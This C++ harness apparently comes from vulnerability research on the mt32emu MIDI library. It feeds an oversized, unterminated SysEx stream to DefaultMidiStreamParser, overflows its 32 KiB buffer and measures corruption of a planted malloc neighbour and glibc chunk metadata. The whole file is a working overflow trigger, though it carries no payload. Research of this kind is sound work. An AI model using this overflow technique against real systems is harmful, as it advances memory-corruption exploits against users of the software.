// W178 bounded experiment: real glibc malloc neighbour of the overflowed
// streamBuffer. Unlike driver.cpp's padded 16 KiB observation region, the
// sentinel here is an ordinary malloc(64) made immediately after the library's
// own new Bit8u[32768] returns. It measures whether the oversized memcpy
// reaches a real allocator neighbour and in which direction glibc stores.
// Harness-created neighbour, NOT an upstream object; rung-4 mechanic only.
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>

#include "mt32emu.h"
#include "c_interface/c_interface.h"

using namespace MT32Emu;

static unsigned char *g_buf = NULL;
static unsigned char *g_sentinel = NULL;
static size_t g_grows = 0;
static const size_t SENTINEL_SIZE = 64;

void *operator new[](size_t n) {
	void *p = malloc(n);
	if (n == 32768) {
		++g_grows;
		if (g_buf == NULL) {
			g_buf = static_cast<unsigned char *>(p);
			g_sentinel = static_cast<unsigned char *>(malloc(SENTINEL_SIZE));
			memset(g_sentinel, 0xA5, SENTINEL_SIZE);
		}
	}
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

static void fill(Bit8u *buf, Bit32u len, bool terminated) {
	memset(buf, 0x5a, len);
	buf[0] = 0xF0;
	if (terminated) buf[len - 1] = 0xF7;
}

// No stdio: aprintf's first call can malloc and the overflow can corrupt the
// top chunk, so output must not allocate.
static void emit(const char *fmt, ...) {
	char line[512];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

static void report(const char *mode, Bit32u len) {
	emit("mode=%s len=%u grows=%zu buf=%p sentinel=%p delta=%ld\n",
		mode, len, g_grows, (void *)g_buf, (void *)g_sentinel,
		g_buf && g_sentinel ? (long)(g_sentinel - g_buf) : -1L);
	if (!g_sentinel) return;
	size_t chosen = 0, intact = 0;
	for (size_t i = 0; i < SENTINEL_SIZE; ++i) {
		if (g_sentinel[i] == 0x5a) ++chosen;
		if (g_sentinel[i] == 0xA5) ++intact;
	}
	char hex[33];
	for (size_t i = 0; i < 16; ++i) snprintf(hex + 2 * i, 3, "%02x", g_sentinel[i]);
	hex[32] = 0;
	emit("sentinel_0x5a=%zu/%zu sentinel_0xa5=%zu/%zu first16=%s\n",
		chosen, SENTINEL_SIZE, intact, SENTINEL_SIZE, hex);
	if (g_buf) {
		size_t tail = 0;
		for (size_t i = 0; i < 7232; ++i)
			if (g_buf[32768 + i] == 0x5a) ++tail;
		emit("tail_0x5a_from_32768=%zu/7232\n", tail);
	}
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "attack";
	Bit32u len = 40001u;
	bool terminated = false;
	if (!strcmp(mode, "exact")) len = 32768u;
	if (!strcmp(mode, "safe")) { len = 102u; terminated = true; }

	Bit8u *stream = new Bit8u[len];
	fill(stream, len, terminated);
	Synth synth;
	DefaultMidiStreamParser *parser = new DefaultMidiStreamParser(synth);
	parser->parseStream(stream, len);
	if (!strcmp(mode, "malloc")) {
		void *next = malloc(32); // real allocator consumes corrupted metadata
		emit("malloc_after_overflow=%s next=%p\n", next ? "ok" : "null", next);
	} else {
		report(mode, len);
	}
	return 0; // leave parser/buffer allocated: overflow may corrupt chunk headers
}
